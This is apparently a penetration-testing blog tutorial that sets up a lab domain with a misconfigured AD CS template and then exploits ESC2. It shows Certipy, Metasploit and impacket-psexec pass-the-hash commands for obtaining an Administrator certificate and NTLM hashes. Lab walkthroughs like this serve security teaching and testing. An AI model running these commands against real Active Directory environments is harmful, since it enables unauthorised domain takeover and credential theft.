<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
            <h1 class="post-title entry-title">AD Certificate Exploitation: ESC2</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ad-certificate-exploitation-esc2/" rel="bookmark"><time class="entry-date published" datetime="2025-04-29T20:12:59+00:00">April 29, 2025</time><time class="updated" datetime="2025-05-10T17:03:07+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In the last article of this AD CS series, we looked at how ESC1 can be used to gain higher privileges in Active Directory. In this post, we’ll explain <strong data-start="328" data-end="367">AD CS ESC2 Certificate Exploitation</strong>, where a low-level user can request an “Any Purpose” certificate. This weak setup lets attackers get certificates for other users, which they can then use to sign in without knowing passwords—putting the whole domain at risk.</span></p>
<h3><span style="color: #800000;">What is ESC2?</span></h3>
<p><span style="color: #000000;">ESC2 (Escalation Path 2) is a vulnerability in Active Directory Certificate Services (AD CS) where a certificate template allows low-privileged users to enroll, and the template includes dangerous Extended Key Usages (EKUs) like:</span></p>
<ul>
<li><span style="color: #000000;">Client Authentication (1.3.6.1.5.5.7.3.2)</span></li>
<li><span style="color: #000000;">Smart Card Logon (1.3.6.1.4.1.311.20.2.2)</span></li>
<li><span style="color: #000000;">Any Purpose (2.5.29.37.0)</span></li>
</ul>
<p><span style="color: #000000;">These EKUs enable the attacker to request a certificate and authenticate as a different user via Kerberos (PKINIT), bypassing passwords entirely.</span></p>
<p><span style="color: #000000;">We’ve already covered the workings of ADCS in detail in previous article, so from this point on, we’ll focus solely on the practical aspects of the ESC2 attack without revisiting the underlying ADCS theory.</span></p>
<p><span style="color: #000000;">The attack abuses misconfigured Extended Key Usages (EKUs) on certificate templates specifically, templates that allow “Client Authentication” or “Any Purpose”, both of which enable Kerberos authentication via PKINIT.</span></p>
<h4><span style="color: #000000;">The Core Idea of ESC2:</span></h4>
<p><span style="color: #000000;">“If I (as a low-privileged user) can get a certificate that allows <strong>Any purpose,</strong> then I can authenticate to the domain as myself — without even knowing my password.”</span></p>
<p><span style="color: #000000;">While that may seem harmless, when combined with NTLM relay or coercion attacks, an attacker can use these same templates to trick a privileged user into requesting a certificate via the vulnerable template thereby obtaining Domain Admin access.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;"><strong>Comparing ESC1 with ESC2</strong></span></p>
<p><span style="color: #000000;"><strong>Why is ESC2 Dangerous?</strong></span></p>
<p><span style="color: #000000;"><strong>Prerequisites</strong></span></p>
<p><span style="color: #000000;"><strong>Lab Setup</strong></span></p>
<p><span style="color: #000000;"><strong>Enumeration and Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">ESC2 Attack Using Certipy</span></li>
</ul>
<p><span style="color: #000000;"><strong>Post Exploitation </strong></span></p>
<ul>
<li><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using impacket-psexec</span></li>
<li><span style="color: #000000;">ESC2 Attack Using Metasploit</span></li>
<li><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></li>
</ul>
<p><span style="color: #000000;"><strong>Mitigation </strong></span></p>
<h3><span style="color: #800000;">Comparing ESC1 with ESC2</span></h3>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiI4WNl2wst2I-rJ0vpCg2-7Z36-zaw1RzuFbTxBKQmZL5qu4OMAZjGz3PjMDPkdj_mfjD4T2S80dk2Sism6gu8rpPaohyQQ4UUzowtlnTkS1z8-wZOv4HU0XLt8i5Iwu64wGKWwHLrB1i3srWg5PACdrVgLm-_FXJak41W7qottPp_uJTySddZmJDuOkxT/s16000/0.png"/></span></p>
<p><span style="color: #000000;">Since the comparison is already clear, let’s go ahead and dive straight into the discussion</span></p>
<h3><span style="color: #800000;">Why is ESC2 Dangerous?</span></h3>
<h4><span style="color: #000000;">Passwordless Authentication with Certificates</span></h4>
<p><span style="color: #000000;">In an ESC2 attack, the adversary bypasses traditional authentication by using a certificate instead of a password to access Active Directory. This eliminates the need to crack passwords or steal password hashes. Since no brute-force methods are required, the attacker can simply enroll for a certificate and authenticate completely sidestepping MFA and any password complexity policies in place.</span></p>
<p><span style="color: #000000;"><strong><em>Impact:</em></strong><em> Even the most secure password configurations and multi-factor authentication setups are rendered ineffective. ESC2 bypasses them all.</em></span></p>
<h4><span style="color: #000000;">Exploitable by Any Domain-Joined User</span></h4>
<p><span style="color: #000000;">ESC2 does not rely on administrative privileges. If a certificate template is misconfigured and accessible by “Authenticated Users, or Any purpose” any standard domain user can exploit it. This means attackers don’t need elevated rights to begin the attack.</span></p>
<p><span style="color: #000000;"><strong><em>Impact:</em></strong><em> A regular user within the network with no special permissions can leverage ESC2 to escalate privileges or maintain access.</em></span></p>
<h4><span style="color: #000000;">Persistent and Stealthy Access</span></h4>
<p><span style="color: #000000;">Certificates often have long lifespans, sometimes months or even years. Once stolen or misused, they can be reused repeatedly without triggering typical alerts like password changes or login failures.</span></p>
<p><span style="color: #000000;"><strong><em>Impact:</em></strong><em> ESC2 enables persistent, stealthy access that is difficult to detect, providing attackers with a long-term foothold in the environment.</em></span></p>
<h4><span style="color: #000000;">Powerful When Combined with Other Attacks</span></h4>
<p><span style="color: #000000;">ESC2 is especially dangerous when combined with attacks like NTLM relay, coercion, or lateral movement, as attackers can trick privileged accounts into requesting vulnerable certificates—leading to full domain compromise.</span></p>
<p><span style="color: #000000;"><strong><em>Impact:</em></strong><em> When chained with other exploits, ESC2 can open the door to complete domain takeover.</em></span></p>
<h4><span style="color: #000000;">Frequently Misunderstood and Overlooked</span></h4>
<p><span style="color: #000000;">Many see certificates as just for encryption, but in AD CS, they serve as powerful authentication tokens—making a misconfigured template as risky as exposing private SSH keys..</span></p>
<p><span style="color: #000000;"><strong><em>Impact:</em></strong><em> ESC2 is often underestimated, leaving organizations unknowingly exposed to severe threats.</em></span></p>
<h4><span style="color: #000000;">Challenging to Detect with Standard Tools</span></h4>
<p><span style="color: #000000;">Certificate issuance in AD CS is silent, with no login prompts or failures, allowing attackers to generate Kerberos tickets and move laterally without triggering typical security alerts.</span></p>
<p><span style="color: #000000;"><strong><em>Impact:</em></strong><em> Traditional SIEMs and antivirus solutions may not detect ESC2 unless they’re explicitly configured to monitor for events like Event ID 4887 or unusual certificate enrollments.</em></span></p>
<p><span style="color: #000000;"><em>Note: ESC2 is like letting an attacker print their own access badge looks legit, works perfectly, but they were never authorized</em></span></p>
<p><span style="color: #000000;">In this Post, we will exploit a misconfigured ADCS environment allowing low-privileged users to impersonate high-privileged accounts via vulnerable certificate templates (ESC2).</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Prerequisite</span> </span></h3>
<ul>
<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT •</span></li>
<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured. •</span></li>
<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
<li><span style="color: #000000;">Tools: Evil-winrm, Impacket, certipy-ad, Metasploit</span></li>
</ul>
<p><span style="color: #000000;">Awesome, let’s walk through the <strong>complete ESC2 ADCS lab setup</strong>, step-by-step.</span></p>
<h3><span style="color: #800000;">Lab setup</span></h3>
<p><span style="color: #000000;">Begin with the Launch of Certificate Template Console</span></p>
<p><span style="color: #000000;"><strong>Run</strong>: <strong>certtmpl.msc</strong> on the Domain Controller and Navigate to Certificate <strong>Templates → Manage</strong></span></p>
<h4>STEPS:</h4>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6PgpPBIbfimx9yDV13ASElp2Zv7GNKd9QUCqCUwMUL0iLjKaKVTOTd5nOfA98zMP3ttrl7uAzKHcwtz9vIHGN1puog9cXxbfcpJJ_45EYVOuJyg-2m_eqsOoU2GRFlz8OQvxON58LIZK9osDvoj4Mw5jdnp6Mz4g5mk_Xfbvc8tC6wXT5yDZk80mneG1t/s16000/1.png"/></span></p>
<h5><strong><span style="color: #000000;">1: Duplicate the “Certificate Template” Template</span></strong></h5>
<ol>
<li><span style="color: #000000;">Scroll down and find the <strong>“Code Signing”</strong> template.</span></li>
<li><span style="color: #000000;">Right-click it → Click <strong>Duplicate Template</strong>.</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFqEPcHPX0FdvdpZhwxGW7lbFVFEu9Dhnw9CEY-COX_w1g4DNgs2ufu80TtIkfokt4L44nQhUshM4GZLucnWxFS6z8eJo9lfvnXXef1wuBNhcMk8UkA_E-GYQTey-r4cf5WQelzbZXf0rzZdUHUSdOsyLIW_2V6qRWmpQioX1bLv3kz0Hu5NmHsg_X11rC/s16000/2.png"/></span></p>
<h5><span style="color: #000000;"><strong>2: Configure the New Template</strong></span></h5>
<p><span style="color: #000000;">A new window will open with tabs. Go tab by tab.</span></p>
<p><strong><span style="color: #000000;">General Tab</span></strong></p>
<ul>
<li><span style="color: #000000;">Change <strong>Template display name</strong> to: ESC2</span></li>
<li><span style="color: #000000;">(Optional) Change Validity Period (default 1 year is fine)</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuKPOKp-B5C6nwKXyTTXB35ZjE0PeKLbPT_V2pu0w7LGRTEw4BtMEZ-vYsq1AqNe8AUO7yFiyapd9Gr0wmFSohsqwAkgjzh81uJJFvRtmvbhEvKAfBWYFSNc0PWtDgHOCynZuP_myUk0EamijmQ6DZILOyYAGJD0Hw1KtHZhxh0G3kjgSKu26hKUDc8mUv/s16000/3.png"/></span></p>
<p><span style="color: #000000;"><em>This name will show up when requesting the certificate</em></span></p>
<p><span style="color: #000000;"><strong>Configure the Subject Name Tab</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Select</strong>: </span><span style="color: #000000;">Build from this Active Directory information</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhd8Vl_nWI7XOCXsHUMogkk_7LuHG9RAZGeCFpbvR55ZYoQ9UnMBJqfuPyQ1Nc62I2ue0xn3shQ3mw1pFDuyzSb4oH1g9xQ9dRFrcadzANvZs2-xYe20pleWa8LPh0YNsrAMQfV9gB9r1qyWeQLPkVNOfaK9ogPDZXTD9Z8qYR7pqshkEGs1NM4cYS6R_hg/s16000/4.png"/></span></p>
<p><span style="color: #000000;"><em>This setting prevents attackers from supplying their own identity (e.g., CN=Administrator)</em></span></p>
<p><strong><span style="color: #000000;">Configure the Extensions Tab</span></strong></p>
<ul>
<li><span style="color: #000000;">Go to the <strong>Extensions</strong> tab</span></li>
<li><span style="color: #000000;">Next, select <strong>Application Policies</strong> → Click <strong>Edit</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifZ61GpkfWNXXE1KRZ_Yat-sY3QDYz8unAP9xEhX644I2rAykdeDuALlgSrznNxcKVSi-hAjYKK5ymvvS9zGd1rrC7ruEHRkEicg_SOXJZwL0vF3YEJzGZnwh8EK9NmNVHXVHjAGpqgxvqSIa_fWWCa9anYpvXHYk9sVruCLxBpee5JKbdK1d27RwWOraP/s16000/5.png"/></span></p>
<p><span style="color: #000000;"><strong><em>Inside the Edit Window:</em></strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Select</strong>: <strong>Code Signing</strong> → Click <strong>Remove</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTNea3Nmm4y-j-6SDCJQvH9U2S5bWWTpB-AZHOghnSzP057V5yCWbN-056hWgiwlz3-PMXNnHuqA9QCqS-9TerG3GPGoiWetA2_aeAobNaRDtGGB_7WlLM9TLDNqBljZ3WX1rl2azra8FOMVQeaICbnRW_4TRDLWmez3q4xoKSmIcQjD6QKpETp8hbRR6X/s16000/6.png"/></span></p>
<ul>
<li><span style="color: #000000;">Click <strong>Add</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbpuXPlvIjc_WElGMawidnfDl0_QLMIamt40-UUfqsMEp_80H-T6WE50pqzVaZRYfus1g_SKIq06Ac6Iq42trMB3WkswgLI_dbNQ29R7eZaYqT3_idD00vrVgYbdQb1YYALH45ASbT4fmzAoKExFtQ5l-ThGbeqZquhALKJCOSvfPALUBgCybinePvfmAb/s16000/7.png"/></span></p>
<ul>
<li><span style="color: #000000;">Select <strong>Any Purpose</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8ANdixpf2DhbBSVAxm7x6-Hkcuh4Fo9uSvFN9EahZF4l0IvepnJcE_r-VLanI8JDF53XuSWktNL4R31WDnBo0BeCIb80q_D4CVa0dNTpLAEiObyc-4g_82TlYD5RTW0LrKWILWPjapwK9Mq5ROAUuM2npPBLJk_RYg8BOmOOLjdxzX7WFetwW-AvM79AG/s16000/8.png"/></span></p>
<ul>
<li><span style="color: #000000;">And Click <strong>OK</strong></span></li>
</ul>
<p><strong><span style="color: #000000;">Configure the Security Tab</span></strong></p>
<ul>
<li><span style="color: #000000;">Click <strong>Add</strong> → Type Domain Users → Click OK</span></li>
<li><span style="color: #000000;">Select Domain Users</span></li>
<li><span style="color: #000000;">Check →  Enroll</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihT7is5-iuIvwxFS4A-KuSJ6J1T90zfJd4n9NNpGdJUDDPHh7HurmT-DugrXrGjY8ZlMj0AQPImTeRchJCJLoVi5DdoW0DUnHKObKFIG4AYXpOcS7H_z1fRQucNnw9vYDS-cUAHTFCglf9f0r27wBv7a4gw3RfpzRy1oPGO2bGitxk-y8zxwoT3Od683DQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;"><em>Allows low-privileged users to request certs, but not impersonate anyone</em></span></p>
<h5><strong><span style="color: #000000;">Notes:</span></strong></h5>
<ul>
<li><span style="color: #000000;">The <strong>Any Purpose</strong> EKU allows the certificate to be used in multiple scenarios, including smart card logon, S/MIME, and VPN access.</span></li>
<li><span style="color: #000000;">Keeping <strong>Client Authentication</strong> or <strong>Any Purpose</strong> ensures the certificate is compatible with Kerberos-based authentication.</span></li>
<li><span style="color: #000000;">Excluding <strong>Code Signing</strong> reduces the risk of abuse, such as using the cert to sign malicious code in poorly secured environments.</span></li>
</ul>
<h5><strong><span style="color: #000000;">Confirm Issuance Requirements</span></strong></h5>
<ul>
<li><span style="color: #000000;">Go back to the Certificate Authority (certsrv.msc) window. Right-click Certificate Templates → Click New → Certificate Template to Issue.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0PXPGHXAMAJ9ADKdrkyT_vDDLjLPz-NLR4JNU0X9yoJQZq6Lq7NTHbjlu25RJx4ecfyhqCWOaeePeT5u14PI0h1WvxY68QmfuQKLI_0InKAW30SMApXMFYk11TjAWgpydMurgTJKCdrYVZeXf4b6BIda8WFYb_dZWkeuCc1dnaeI-ZHS0bR6a41vX-2cb/s16000/10.png"/></span></p>
<ul>
<li><span style="color: #000000;">Find Vulnerable Template in the list and select it, in our case we created it as ESC2.</span></li>
<li><span style="color: #000000;">Finally, click OK to publish it</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOj6XO0ORHzImqQk0GJkB90T33jwWRCkPXp5B72zTiYhccf0Tl32jGRlkfilbBe8xfV6yJ6iT_dc49mQrnpHZwhhYF2qcvROBelHFuoIefTogT73JGpv7tXtpPFBbHIeHgDVNGwRV5o2hNbVPZwrNivJ3KjExDZgQ_RmDu-CCFBZncV92m7oXpU9didmzK/s16000/11.png"/></span></p>
<h5><strong><span style="color: #000000;">Save the Template</span></strong></h5>
<ul>
<li><span style="color: #000000;">Click <strong>OK</strong> to save and close</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj74hleUnDKUDICeLn3Hw0Q_Akwhm46XcSn88yNJJM9voQTYG-lHof21MipW__7BFc7y-q-gtWfaIcAw054rhH_m0tyLEKrQ2lYgyRcv2cp1MGpTEhvZvGeIyoBmHqUzINxeP22hFhqCAvB7BA351itiLexU8baQuZ15mz35STXbFR_yzM7_l4hE5eqeuSq/s16000/12.png"/></span></p>
<p><span style="color: #000000;">We can see our <strong>template</strong> is now created!</span></p>
<h3><span style="color: #800000;">Enumeration &amp; Exploitation</span></h3>
<h4><span style="color: #000000;">ESC2 Attack Using Certipy</span></h4>
<p><span style="color: #000000;">Certipy is a Python tool that helps enumerate and exploit AD CS by identifying vulnerable templates, requesting and converting certificates, and enabling authentication methods like Kerberos, DCSync, and Rubeus-style attacks.</span></p>
<h5><span style="color: #000000;"><strong>Enum for Vulnerable Templates</strong></span></h5>
<p><span style="color: #000000;">Use your <strong>valid low-priv credentials</strong> (raj in our case) to check ADCS:</span></p>
<p><span style="color: #000000;">Fire the command as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'raj@ignite.local' -p Password@1 -dc-ip 192.168.1.48 -vulnerable -enabled</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxtY9qdAgysGnnRLYIZOybwExnSNQTh0XDpeymNxb59uIU2jForM3JYA_MZIGwqYE-Y9oSR5MX9gQ9QC_aBwyP6Mlh39PI1_n0FT11VbJoFLEuxc00TIIFb9__21j3DoExmz-5MT-mf1M5146G0XG4tHBR83fvmui6eEwTNzW7Kbhq6wWKve261YZT4nV1/s16000/13.png"/></span></p>
<p><span style="color: #000000;">The output should indicate that the ESC2 template is enrollable by the user raj, allows the subject to be specified in the request, and includes the “Any purpose” EKU in our case.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgr1DZFs_118hHV4X5ur46E_duNns-Jqn4ex2zPjerFhPTHx7PUqpZZ2TRzOCQczjjf3s9hm7-3PnUB-LBcHCf2duwoH9Qc3gwUnelN2E9QMo7I2d_CvTD6fXFDNRUYP2qSJS7L3L8t9mzn29rW7YHn44K8CTyFfIbQm5TeT6F4acuZFlb0XGtsP7aWHZUh/s16000/14.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivt1q_QISrkDRoE8-MJPFCBADPfPfF4SQ7mPAHUp94jsQBS5ykHqsPU3DWv5F_0ULaTtOtW7DYapvm3-UMuOyYH5Ni7KObhwT-cnFb8juCKUvcpECeaTr1SYOpOi0X3W5MV4s8TbLRxN8caEFXA1pIDuntehqJQCOn8-Db2w1z_7KAq6aMbvjLA5gokYS0/s16000/15.png"/></span></p>
<h5><span style="color: #000000;"><strong>Request a Certificate as Administrator</strong></span></h5>
<p><span style="color: #000000;">Use the vulnerable template to request a certificate for your own user (eg: raj)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u 'raj@ignite.local' -p 'Password@1' -dc-ip 192.168.1.48  -ca ignite-DC-CA -target 'dc.ignite.local' -template 'ESC2'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnIfpSUHhUjjhQpqK3mNQZy9FP7QRj2RuLH0u7LhTG9o07pcwNj-y0LovfNGAADB4_gT7swRAMHMO9H2ZTeYP5HjwwWfinYwAvR1lv17-JgBhDrFFFWyADeaSgtZmT1lqK7sN249lRBA8b6D61ccmLgMMvu4_cG5lgD1cZc3dT_F6grxw8LqkLkFKmKzyB/s16000/16.png"/></span></p>
<p><span style="color: #000000;">If Successful, Certipy saves a <strong>.pfx</strong><strong> certificate file</strong> (raj.pfx in our case)!</span></p>
<p><span style="color: #000000;">We’re directing Certipy to log in as raj, use the ‘User’ certificate template to request a cert on behalf of Administrator, and save the resulting certificate as <strong>raj.pfx</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u 'raj@ignite.local' -p 'Password@1' -dc-ip 192.168.1.48  -ca ignite-DC-CA -target 'dc.ignite.local' -template 'User' -on-behalf-of administrator -pfx raj.pfx</pre>
<p><span style="color: #000000;">If successful, this results in a <strong>valid certificate for </strong><strong>Administrator</strong> without needing their credentials.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTTV1GibC1ihzW3D7stZjTyGAhVRW0q6KM6Kb2MmyzxPNn_tZ_qJob9LxQThf0_LfbA3Wsju6AiFdzxJu5Tp4YBOlJuaiJp1j9s3iPu0dctJFvMDQ9wPFgcib1R_KuIrHtnci6r0lz4t0T5axSsrg7w5EU2H0ayZI09fXwR0U_7KvZ58OPGcPKgDpjNfkL/s16000/17.png"/></span></p>
<p><span style="color: #000000;"><em>Note: The </em><em>-on-behalf-of administrator</em><em> flag is the key impersonation step, it tells the CA to issue a certificate for Administrator instead of the requesting user.</em></span></p>
<h5><span style="color: #000000;"><strong>Use the Certificate</strong></span></h5>
<p><span style="color: #000000;">Once authenticated as Administrator, dump NTLM hashes from the Domain Controller</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx  -dc-ip 192.168.1.48</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgt1yxCLu3HsqhjNX6ujtzujqhVWOKdyheSwkNSFbfERwlwftD8Zpgm1Eq8HpHsHQdLIIOQHgzZKSCAjFToZp7q97-wJr2nXLpt-xuBGmswRYParsup5aHhWs27XUAcvA7Hvqr8vIU_RdnGQ6RXRP1m3HeZQolySM0esp-uw8J9u5Wwe-SUgpyWaIPhQADA/s16000/18.png"/></span></p>
<h3><span style="color: #800000;">Post Exploitation</span></h3>
<h4><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using impacket-psexec</span></h4>
<p><span style="color: #000000;">After obtaining NTLM hashes, move laterally using Pass-the-Hash (PTH) attacks.</span></p>
<p><span style="color: #000000;">For this using an amazing tool impacket with the command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32196b56ffe6f45e294117b91a83bf38 administrator@192.168.1.48</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_ktapyCBU4NksmBvmnobYNi4OAB0cuoWLM6ZrZu5EG_QOi-ueqGmi9bCixgNaqJhkwSi7A2ph_f-SiDAMJlEzxdfs10s5y3J6SIDDWHCF6pJ24txeT3g5Uv4sj7nGO_KJ73DdDAH_NSh1w7Ym9LSXVTPGFoJ2bFXLE1WdhEB0qTe2TUCwn28nqcGf4zW2/s16000/19.png"/></span></p>
<h4><span style="color: #000000;">ESC2 Attack Using Metasploit</span></h4>
<p><span style="color: #000000;">The Metasploit module<strong> auxiliary/gather/ldap/ldap_esc_vulnerable_cert_finder</strong> is used to <strong>enumerate vulnerable AD CS certificate templates</strong> directly via LDAP — it detects misconfigurations like ESC2.</span></p>
<p><span style="color: #000000;">Let’s walk through how to <strong>use it effectively</strong>, then how to <strong>exploit ESC2</strong> based on the results.</span></p>
<ul>
<li><strong><span style="color: #000000;">Enumeration for vulnerable certificate templates</span></strong></li>
</ul>
<p><span style="color: #000000;">Launch Metasploit: msfconsole</span></p>
<p><span style="color: #000000;">Load the Module:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/gather/ldap/ldap_esc_vulnerable_cert_finder
set RHOSTS 192.168.1.48
set DOMAIN ignite.local
set USERNAME raj
set PASSWORD Password@1
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWn2i1sWewNhlePZc-MNWPVQUFf5eqrCivx4BMMH899FG-gOaRxEu3qDlFxTMw5E0rX_2p8sxNNEL03XrIAk06m1P-ksbRVawqDGQ-8ZN657O_F02DhDy1pR27C25kWr_0wyUIDtU_pM6oZ6AgSRX7KxxP5E2Y3mkaQW_7y0WggOhJxaDUFiQQ2OcWVVkL/s16000/20.png"/></span></p>
<p><span style="color: #000000;">This confirms <strong>ESC2 is possible(vulnerable)</strong> — the template allows impersonation.</span></p>
<ul>
<li>
<h5><strong><span style="color: #000000;">Request a Certificate as Administrator</span></strong></h5>
</li>
</ul>
<p><span style="color: #000000;">This Metasploit module auxiliary/admin/dcerpc/icpr_cert exploits misconfigured AD CS templates ESC2 by requesting certificates via RPC instead of the web interface and saving the resulting .pfx file for future authentication.</span></p>
<p><span style="color: #000000;">The AD CS server approved the certificate request, issuing a certificate linked to raj@ignite.local.</span><br/>
<span style="color: #000000;">It was saved as a .pfx (PKCS#12) file at: /root/.msf4/loot/…, containing both the certificate and private key ready for PKINIT-based authentication.</span><br/>
<span style="color: #000000;">The loot command output confirms:</span><br/>
<span style="color: #000000;">• The .pfx file is valid and stored locally</span><br/>
<span style="color: #000000;">• It can now be used to authenticate as raj or impersonate another user, depending on the template permissions</span></p>
<p><span style="color: #000000;"><strong>Load the Certificate Request Module</strong> </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/dcerpc/icpr_cert
set RHOSTS 192.168.1.48
set CA ignite-DC-CA
set CERT_TEMPLATE ESC2
set SMBDomain ignite.local
set SMBPass Password@1
set SMBUser raj
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpAh3ehQgnYK-Zdot87Z8MAcwbLh4u3gkfu9ydGxsnFC-BFy-udB4CWs3xFsV-bEl-uhS7bEHdZMW1YCxyGVIeSBYJsclq3T6tsQ6ndWJimMgohF4GgKLplxN_4UVvPjHJWRGALghbQsJxfvOF9zZhGzzuL9xuGv9pGVc8Jc6TwOGTbobZCN9tqQwji9BE/s16000/21.png"/></span></p>
<p><span style="color: #000000;">We’ve successfully performed an ESC2 attack using the Metasploit module admin/dcerpc/icpr_cert, impersonating the Administrator account and obtaining a valid PFX certificate issued in their name.</span></p>
<p><span style="color: #000000;">Setting ON_BEHALF_OF allows a low-privileged user to request a certificate on behalf of another user in this case, the Administrator.</span></p>
<p><span style="color: #000000;"><em>Note: It works <strong>only if</strong> the certificate template allows it (SubjectAltName from requester &amp; no Manager Approval or ENROLLEE_SUPPLIES_SUBJECT restrictions).</em></span></p>
<p><span style="color: #000000;">We selected the ‘User’ certificate template, which is likely enrollable by the current user.</span></p>
<h5><span style="color: #000000;"><strong>Load the Certificate Request Module</strong> </span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set ON_BEHALF_OF Administrator
set PFX root/.msf4/loot/20250112054234_default_192.168.1.48_windows.ad.cs_334626.pfx
set CERT_TEMPLATE User
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiO1c5zwqR6ZKFiwOAa7IT2nWA-Mg0hLnYXD_LzQ8QmvCctmlRsiu9P1eExvRjcPVEPnGk-7LjCMxNk_kElaRyTpZAk-zU7LFsCQ9vnQsuj0msokz92Wa5fhCGrsmaXTPYhy6WGzqGRAns36kmBmtbC4l_UEoKxFkR_qX1ok0XetGA-sMP56NpbxTttYjOL/s16000/22.png"/></span></p>
<p><span style="color: #000000;">We successfully obtained a certificate as Administrator, confirming the template’s vulnerability to ESC2, and the resulting .pfx file now serves as Administrator’s private key and certificate, enabling Kerberos authentication as that user using Certipy or similar tools.</span></p>
<p><span style="color: #000000;">Renaming it to administrator.pfx helps you <strong>quickly identify</strong> the cert as belonging to the impersonated Administrator account.</span></p>
